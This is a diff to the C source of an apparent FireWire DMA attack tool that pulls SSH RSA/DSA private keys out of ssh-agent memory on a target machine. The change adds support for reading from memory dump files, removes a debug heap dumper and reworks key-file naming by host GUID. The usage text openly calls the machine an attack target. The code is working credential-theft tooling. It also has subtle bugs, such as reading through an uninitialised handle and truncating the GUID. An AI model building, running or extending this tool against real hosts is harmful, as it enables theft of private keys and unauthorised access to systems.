@@ -21,8 +21,6 @@
  *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
  */
 
-//#define DUMP_HEAP
-
 #define _LARGEFILE64_SOURCE
 
 // needed for memmem:
@@ -61,38 +59,11 @@ char pagedir[4096];
 // this may take several seconds, depending on keytype and length!
 int test_keys = 0;
 
+// uuid - unique uid for the memory source (filename of memdump or
+// ieee1394-GUID of host)
+char* uuid = NULL;
+
 #define NODE_OFFSET     0xffc0
-
-#ifdef DUMP_HEAP
-// dump a page in a neat, readable style to the file f
-void dump_page(FILE* f,uint32_t pn, char* page)
-{{{
-	uint32_t addr;
-	int i,j;
-	char c;
-	fprintf(f, "dump page %x\n", pn);
-
-	addr = pn * 4096;
-	for(i = 0; i<4096; i+=16) {
-		fprintf(f, "page 0x%05x, addr 0x%08x: ", pn, addr+i);
-		for(j = 0; j < 16; j++) {
-			fprintf(f, "%02hhx ", (page+i)[j]);
-			if((j+1)%4 == 0 && j)
-				fputc(' ',f);
-		}
-		fprintf(f,"  |  ");
-		for(j = 0; j < 16; j++) {
-			c = (page+i)[j];
-			if(c < 0x20)
-				c = '.';
-			if(c >= 0x7f)
-				c = '.';
-			fputc(c,f);
-		}
-		fprintf(f,"\n");
-	}
-}}}
-#endif
 
 // fix a remote bignum to a local bignum:
 // copy all important internal data of struct bignum_st.
@@ -330,29 +301,20 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	return 0;
 }}}
 
-// create a unique filename, consisting of target's 1394-GUID, ssh-agent's
+// create a unique filename, consisting of UUID, ssh-agent's
 // username and key's comment and save the key to this file.
-void save_key(linear_handle lin, char *key_comment, Key* key, char *username)
+void save_key(char *key_comment, Key* key, char *username)
 {{{
-	uint32_t high;
-	uint32_t low;
-	uint64_t guid;
-
 	char* comment;
 	char* p;
 
 	char* comment_field;		// finally used for comment-field in dumped key
 	char* filename;			// file to dump key to
+	char* id;
+	char* bid;
 
-	// get GUID of target
-	raw1394_read(lin->phy->data.ieee1394.raw1394handle, lin->phy->data.ieee1394.raw1394target, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x0c, 4, &low);
-	raw1394_read(lin->phy->data.ieee1394.raw1394handle, lin->phy->data.ieee1394.raw1394target, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x10, 4, &high);
-#ifndef __BIG_ENDIAN__  
-	guid = (((uint64_t)high) << 32) | low;
-	guid = endian_swap64(guid);
-#else
-	guid = (((uint64_t)low) << 32) | high;
-#endif
+	id = strdupa(uuid);
+	bid = basename(id);
 
 	// create a comment that does not contain slashes
 	comment = malloc(strlen(key_comment) + 1);
@@ -367,10 +329,10 @@ void save_key(linear_handle lin, char *key_comment, Key* key, char *username)
 	}
 	*p = 0;
 	
-	comment_field = malloc(strlen(username)+16+6+1);
-	sprintf(comment_field, "%s@host_%016llx", username, guid);
-	filename = malloc(16 + strlen(username) + strlen(comment_field) + 6 + 1);
-	sprintf(filename, "key %016llx %s %s", guid, username, comment);
+	comment_field = malloc( 7 + strlen(username) + strlen(bid) );
+	sprintf(comment_field, "%s@host_%s", username, bid);
+	filename = malloc(7 + strlen(bid) + strlen(username) + strlen(comment_field));
+	sprintf(filename, "key %s %s %s", bid, username, comment);
 
 	// dump the key
 	printf("\t\t" TERM_CYAN "dumping key \"%s\" to file \"%s\"" TERM_RESET "\n", comment_field, filename);
@@ -412,9 +374,6 @@ void check_ssh_agent(linear_handle lin, char **envv)
 	time_t death;	// when the key dies
 	Key key;	// the key we want
 	int n;
-#ifdef DUMP_HEAP
-	FILE *heapfile;
-#endif
 
 	printf( TERM(TERM_A_BLINK,TERM_C_BG_RED) "hit:" TERM_RESET " ");
 
@@ -438,16 +397,6 @@ void check_ssh_agent(linear_handle lin, char **envv)
 	for(pn = 0; pn < AGENT_MAXLEN; pn++) {
 		linear_read_page(lin, AGENT_START + pn, heap + 4096 * pn);
 	}
-
-#ifdef DUMP_HEAP
-	printf(TERM_RED"DEBUG"TERM_RESET": dumping full heap to heap.txt\n");
-	heapfile = fopen("heap.txt", "w");
-
-	for(pn = 0; pn < AGENT_MAXLEN; pn++) {
-		dump_page(heapfile, AGENT_START + pn, heap + 4096*pn);
-	}
-	fclose(heapfile);
-#endif
 
 	// find all substrings in the heap (one for each loaded keypair that resides in $HOME/.ssh/)
 	comment = heap;
@@ -527,7 +476,7 @@ void check_ssh_agent(linear_handle lin, char **envv)
 		}
 		// save the key to a file
 		if(key.rsa || key.dsa)
-			save_key(lin, comment, &key, resolve_env(envv, "USER"));
+			save_key(comment, &key, resolve_env(envv, "USER"));
 
 		// TODO: free key...
 	}
@@ -540,17 +489,19 @@ void check_ssh_agent(linear_handle lin, char **envv)
 // show usage info
 void usage(char* argv0)
 {{{
-	printf(	"%s ["TERM_BLUE"-t"TERM_RESET"] <"TERM_YELLOW"node-id"TERM_RESET">\n"
+	printf(	"%s ["TERM_BLUE"-t"TERM_RESET"] <"TERM_YELLOW"-n node-id"TERM_RESET" | "TERM_YELLOW"-f file"TERM_RESET">\n"
 		"\n"
 		"i will snarf ssh public/private keypairs from all ssh-agents i can\n"
-		"find on the system hanging on your IEEE1394 bus with the given\n"
-		TERM_YELLOW"node-id"TERM_RESET". node-id should be an integer in [0..63]; you can use\n"
-		"``1394csrtool -s'' or ``gscanbus'' or other bus-scanning tools to\n"
-		"identify the attack-target.\n"
+		"find on\n"
+		"   * the system hanging on your IEEE1394 bus with the given\n"
+		"     "TERM_YELLOW"node-id"TERM_RESET". node-id should be an integer in [0..63]; you can\n"
+		"     use ``1394csrtool -s'' or ``gscanbus'' or other bus-scanning tools to\n"
+		"     identify the attack-target.\n"
+		"   * the memory dump identified by "TERM_YELLOW"file"TERM_RESET"\n"
 		"\n"
 		TERM_RED"be aware"TERM_RESET", that i only operate on IA32 linux with no more than 4GB\n"
 		"of RAM and that i only search for ``ssh-agent'' processes and keys\n"
-		"loaded into them with the absolute path of ``$HOME/.ssh''.\n"
+		"loaded into them with the absolute path of ``$HOME/.ssh/''.\n"
 		"\n"
 		"if you specify ``"TERM_BLUE"-t"TERM_RESET"'' i will try to verify that the snarfed\n"
 		"keypair is ok.\n"
@@ -559,6 +510,12 @@ void usage(char* argv0)
 		argv0
 		);
 }}}
+
+enum memsource {
+	SOURCE_UNDEFINED,
+	SOURCE_MEMDUMP,
+	SOURCE_IEEE1394
+};
 
 // will scan the targets memory for pagedirs,
 // for each found:
@@ -574,11 +531,32 @@ int main(int argc, char**argv)
 	int c;
 	char *p;
 
+	enum memsource memsource = SOURCE_UNDEFINED;
+	char *filename;
+	int nodeid;
+
+	uint64_t guid;
+	uint32_t high;
+	uint32_t low;
+
 	// parse arguments
-	while( -1 != (c = getopt(argc, argv, "t"))) {
+	while( -1 != (c = getopt(argc, argv, "tn:f:"))) {
 		switch (c) {
 			case 't':
 				test_keys = 1;
+				break;
+			case 'n':
+				memsource = SOURCE_IEEE1394;
+				nodeid = strtoll(optarg, &p, 10);
+				if((p&&(*p)) || (nodeid > 63) || (nodeid < 0)) {
+					printf("invalid nodeid. nodeid should be >=0 and <64.\n");
+					usage(argv[0]);
+					return -2;
+				}
+				break;
+			case 'f':
+				memsource = SOURCE_MEMDUMP;
+				filename = optarg;
 				break;
 			default:
 				usage(argv[0]);
@@ -586,31 +564,61 @@ int main(int argc, char**argv)
 				break;
 		}
 	}
-	if(NULL == argv[optind])
-		{ printf("please give nodeid\n"); usage(argv[0]); return -2; }
-	c = strtoll(argv[optind], &p, 10);
-	if((argv[optind] == p) || (c > 63) || (c < 0))
-		{ printf("invalid nodeid. nodeid should be >=0 and <64.\n"); usage(argv[0]); return -2; }
+	if(c != -1) {
+		printf("too many arguments? (\"%s\")\n", argv[c]);
+		usage(argv[0]);
+		return -2;
+	}
 
 	// prepare and associate physical handle
 	phy = physical_new_handle();
 	if(!phy)
 		{ printf("physical handle is null! insufficient memory?!\n"); return -1; }
-	// create raw1394handle
-	phy_data.ieee1394.raw1394handle = raw1394_new_handle();
-	if(!phy_data.ieee1394.raw1394handle)
-		{ printf("failed to open raw1394\n"); return -3; }
-	// associate raw1394 to port
-	if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0))
-		{ printf("raw1394 failed to set port\n"); return -3; }
-	// set attack target
-	phy_data.ieee1394.raw1394target = c + NODE_OFFSET;
-	printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
-	if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
-		printf("physical_handle_associate() failed\n");
-		return -3;
+	if( memsource == SOURCE_IEEE1394 ) {
+		// create raw1394handle
+		phy_data.ieee1394.raw1394handle = raw1394_new_handle();
+		if(!phy_data.ieee1394.raw1394handle)
+			{ printf("failed to open raw1394\n"); return -3; }
+		// associate raw1394 to port
+		if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0))
+			{ printf("raw1394 failed to set port\n"); return -3; }
+		// set attack target
+		phy_data.ieee1394.raw1394target = nodeid + NODE_OFFSET;
+		printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
+		if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
+			printf("physical_handle_associate() failed\n");
+			return -3;
+		}
+		// get GUID of target
+		raw1394_read(lin->phy->data.ieee1394.raw1394handle, nodeid+NODE_OFFSET, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x0c, 4, &low);
+		raw1394_read(lin->phy->data.ieee1394.raw1394handle, nodeid+NODE_OFFSET, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x10, 4, &high);
+		// GUID is in big endian.
+#ifndef __BIG_ENDIAN__  
+		guid = (((uint64_t)high) << 32) | low;
+		guid = endian_swap64(guid);
+#else
+		guid = (((uint64_t)low) << 32) | high;
+#endif
+		uuid = malloc(9);
+		snprintf(uuid, 8, "%08llx", guid);
+	} else if( memsource == SOURCE_MEMDUMP ) {
+		c = open(filename, O_RDONLY);
+		if(c < 0) {
+			printf("failed to open file \"%s\"\n", filename);
+			return -2;
+		}
+		phy_data.filedescriptor.fd = c;
+		if(physical_handle_associate(phy, physical_filedescriptor, &phy_data, 4096)) {
+			printf("physical_handle_associate() failed\n");
+			return -3;
+		}
+		uuid = filename;
+	} else {
+		printf("missing memory source\n");
+		usage(argv[0]);
+		return -2;
 	}
-
+	
 	// prepare and associate linear handle
 	lin = linear_new_handle();
 	printf("assoc lin handle..\n"); fflush(stdout);
@@ -684,7 +692,13 @@ int main(int argc, char**argv)
 
 	// release handles
 	linear_handle_release(lin);
-	raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
+
+	if( memsource == SOURCE_IEEE1394 ) {
+		raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
+	} else if( memsource == SOURCE_MEMDUMP ) {
+		close(phy_data.filedescriptor.fd);
+	}
+
 	physical_handle_release(phy);
 	
 	return 0;
